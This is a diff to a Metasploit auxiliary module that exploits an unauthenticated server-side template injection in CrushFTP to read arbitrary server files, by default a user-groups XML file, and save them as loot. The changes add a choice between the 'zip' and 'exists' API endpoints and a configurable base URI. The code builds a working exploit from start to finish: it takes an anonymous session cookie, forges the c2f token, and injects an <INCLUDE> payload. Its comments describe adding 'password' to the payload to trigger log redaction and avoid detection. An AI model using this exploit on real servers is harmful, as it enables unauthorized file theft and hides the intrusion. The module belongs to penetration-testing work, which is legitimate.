@@ -40,10 +40,11 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        Opt::RPORT(443),
-        Opt::RHOST('0.0.0.0'),
-        OptBool.new('STORE_LOOT', [false, 'Store the target file as loot', true]),
-        OptString.new('TARGETFILE', [true, 'The target file to read. This can be a full path, a relative path, or a network share path (if firewalls permit)', 'users/MainUsers/groups.XML']),
+        Opt::RPORT(8080),
+        OptBool.new('STORE_LOOT', [true, 'Store the target file as loot', false]),
+        OptString.new('TARGETFILE', [true, 'The target file to read. This can be a full path, a relative path, or a network share path (if firewalls permit). Files containing binary data may not be read accurately', 'users/MainUsers/groups.XML']),
+        OptString.new('TARGETURI', [true, 'The URI path to CrushFTP', '/']),
+        OptEnum.new('INJECTINTO', [true, 'The CrushFTP API function to inject into', 'zip', ['zip', 'exists']])
       ]
     )
   end
@@ -52,9 +53,9 @@ class MetasploitModule < Msf::Auxiliary
     # Unauthenticated requests to WebInterface endpoints should receive a response containing an 'anonymous' user session cookie
     res_anonymous_check = get_anon_session
 
-    return Msf::Exploit::CheckCode::Unknown('Connection failed') unless res_anonymous_check
+    return Msf::Exploit::CheckCode::Unknown('Connection failed - unable to get 404 page response (confirm target and SSL settings)') unless res_anonymous_check
 
-    # Confirm that the response returned a CrushAuth cookie and the status code was 404
+    # Confirm that the response returned a CrushAuth cookie and the status code was 404. If this is not the case, the target is probably not CrushFTP
     if (res_anonymous_check.code != 404) || !res_anonymous_check.get_cookies.include?('CrushAuth')
       return Msf::Exploit::CheckCode::Unknown('The application did not return a 404 response that provided an anonymous session cookie')
     end
@@ -64,13 +65,13 @@ class MetasploitModule < Msf::Auxiliary
 
     # The string "password" is included to invoke CrushFTP's sensitive parameter redaction in logs. The injection will be logged as "********"
     # NOTE: Due to an apparent bug in the way CrushFTP redacts data, if file paths contain ":", some of the injection will be leaked in logs
-    res_template_inject = perform_template_injection('{user_name}password', crushauth_cookie)
+    res_template_inject = perform_template_injection(datastore['INJECTINTO'], '{user_name}password', crushauth_cookie)
 
-    return Msf::Exploit::CheckCode::Unknown('Connection failed') unless res_template_inject
+    return Msf::Exploit::CheckCode::Unknown('Connection failed - unable to get template injection page response') unless res_template_inject
 
-    # Confirm that the "{user_name}" template injection evaluates to "anonymous" in the response
-    unless res_template_inject.body.include?('You need upload permissions to zip a file:anonymous')
-      return Msf::Exploit::CheckCode::Safe('Server-side template injection failed!')
+    # Confirm that the "{user_name}" template injection evaluates to "anonymous" in the response. If it does not, the application is not vulnerable
+    unless res_template_inject.body.include?('anonymous')
+      return Msf::Exploit::CheckCode::Safe('Server-side template injection failed - CrushFTP did not evaluate the injected payload')
     end
 
     Msf::Exploit::CheckCode::Vulnerable('Server-side template injection successful!')
@@ -81,9 +82,9 @@ class MetasploitModule < Msf::Auxiliary
     print_status('Fetching anonymous session cookie...')
     res_anonymous = get_anon_session
 
-    fail_with(Failure::Unknown, 'Connection failed') unless res_anonymous
+    fail_with(Failure::Unknown, 'Connection failed - unable to get 404 page response') unless res_anonymous
 
-    # Confirm that the response returned a CrushAuth cookie and the status code was 404
+    # Confirm that the response returned a CrushAuth cookie and the status code was 404. If this is not the case, the target is probably not CrushFTP
     if (res_anonymous&.code != 404) || res_anonymous&.get_cookies !~ /CrushAuth=([^;]+;)/
       fail_with(Failure::Unknown, 'The application did not return a 404 response that provided an anonymous session cookie')
     end
@@ -102,17 +103,17 @@ class MetasploitModule < Msf::Auxiliary
     file_end_tag = 'file-end'
 
     # Perform the template injection for file read
-    res_steal_file = perform_template_injection("#{file_begin_tag}<INCLUDE>#{file_name}</INCLUDE>#{file_end_tag}", crushauth_cookie)
+    res_steal_file = perform_template_injection(datastore['INJECTINTO'], "#{file_begin_tag}<INCLUDE>#{file_name}</INCLUDE>#{file_end_tag}", crushauth_cookie)
 
     # Check for failure conditions
     fail_with(Failure::Unknown, 'Connection failed - unable to perform template injection') unless res_steal_file
 
     if (res_steal_file&.code != 200) || !(res_steal_file.body.include? file_begin_tag)
-      fail_with(Failure::Unknown, 'The application did not return the file contents as expected')
+      fail_with(Failure::Unknown, 'The application did not respond as expected - the response did not return a 200 status with file contents in the body')
     end
 
     if res_steal_file.body.include? "#{file_begin_tag}<INCLUDE>#{file_name}</INCLUDE>#{file_end_tag}"
-      fail_with(Failure::NotFound, 'The requested file was not found by the server')
+      fail_with(Failure::NotFound, 'The requested file was not found - the target file does not exist or the system cannot read it')
     end
 
     # Isolate the file contents in the response by extracting data between the begin and end tags
@@ -120,8 +121,8 @@ class MetasploitModule < Msf::Auxiliary
     file_data = file_data.split(file_end_tag)[0]
 
     if datastore['STORE_LOOT']
-      print_good('Storing the file data to loot...')
       store_loot(File.basename(file_name), 'text/plain', datastore['RHOST'], file_data, file_name, 'File read from CrushFTP server')
+      print_good('Stored the file data to loot...')
     else
       # A new line is sent before file contents for better readability
       print_good("File read succeeded! \n#{file_data}")
@@ -132,26 +133,46 @@ class MetasploitModule < Msf::Auxiliary
   def get_anon_session
     send_request_cgi(
       'method' => 'GET',
-      'uri' => normalize_uri('WebInterface/')
+      'uri' => normalize_uri(target_uri.path, 'WebInterface/')
     )
   end
 
   # The 'zip' API function is used here, but any unauthenticated API function that reflects parameter data in the response should work
-  def perform_template_injection(payload, cookie)
-    send_request_cgi(
-      {
-        'method' => 'POST',
-        'uri' => normalize_uri('WebInterface', 'function/'),
-        'cookie' => "CrushAuth=#{cookie}",
-        'headers' => { 'Connection' => 'close' },
-        'vars_post' => {
-          'command' => 'zip',
-          'path' => payload,
-          'names' => '/',
-          # The c2f parameter must be the last four characters of the primary session cookie
-          'c2f' => cookie.to_s[-4..]
+  def perform_template_injection(page, payload, cookie)
+    if page == 'zip'
+      send_request_cgi(
+        {
+          'method' => 'POST',
+          'uri' => normalize_uri(target_uri.path, 'WebInterface', 'function/'),
+          'cookie' => "CrushAuth=#{cookie}",
+          'headers' => { 'Connection' => 'close' },
+          'vars_post' => {
+            'command' => 'zip',
+            # This value will be printed in responses to unauthenticated zip requests, resulting in template payload execution
+            'path' => payload,
+            'names' => '/',
+            # The c2f parameter must be the last four characters of the primary session cookie
+            'c2f' => cookie.to_s[-4..]
+          }
         }
-      }
-    )
+      )
+    # The 'page' value is "exists"
+    elsif page == 'exists'
+      send_request_cgi(
+        {
+          'method' => 'POST',
+          'uri' => normalize_uri(target_uri.path, 'WebInterface', 'function/'),
+          'cookie' => "CrushAuth=#{cookie}",
+          'headers' => { 'Connection' => 'close' },
+          'vars_post' => {
+            'command' => 'exists',
+            # This value will be printed in responses to "exists" requests, resulting in template payload execution
+            'paths' => payload,
+            # The c2f parameter must be the last four characters of the primary session cookie
+            'c2f' => cookie.to_s[-4..]
+          }
+        }
+      )
+    end
   end
 end
